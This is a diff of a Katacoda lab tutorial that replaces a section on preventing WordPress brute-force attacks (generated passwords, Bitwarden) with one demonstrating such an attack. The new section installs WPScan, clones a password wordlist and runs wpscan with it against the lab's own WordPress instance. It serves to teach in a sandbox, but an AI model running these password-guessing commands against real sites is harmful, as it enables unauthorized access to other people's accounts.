@@ -1,15 +1,32 @@
-## **Prevent Brute-Force Attack**
+## **3. Introduction Brute-Force Attack**
 ---
-## **Step 1: Use Password generate by WordPress**
-### When you set up your WordPress website. It will suggest a complex password like the following image:
 
-![Katacoda Logo](./assets/PasswordGen.png)
-
-### The password that wordpress provide is long and complex which is hard to guess by the Brute-Force attack and it is suggested to use the password that WordPress provided.
-<br></br>
-## **Step 2: Open Bitwarden**
-Bitwarden is an open source password manager which can help user to store and manage their password.To use the Bitwarden, you need to access the following website and create an account:
-```sh
-https://vault.bitwarden.com/{{copy}}
+## **What is Brute-force attack?**
 ```
+Brute-force attack means the attacker submits a huge number of passwords or usernames to guess the username and password correctly. 
+```
+### Now let try to enforce the brute-force attack to the WordPress website we have just created.
+<br></br>
+## Step 1:
+### Download the WPscan using the command:
 
+```sh
+gem install wpscan{{execute}}
+```
+<br></br>
+## Step 2:
+### Clone the crack.txt file which includes a list of password from Github using the command:
+```sh
+git clone https://github.com/tonywong586/CrackList.git{{execute}}
+```
+<br></br>
+access the CrackList file using the following command:
+```sh
+cd CrackList
+```
+<br></br>
+## Step 4:
+### Use the following command to enforce the Brute-force attack
+```sh
+wpscan --url https://[[HOST_SUBDOMAIN]]-8000-[[KATACODA_HOST]].environments.katacoda.com --passwords crack.txt{{execute}}
+```
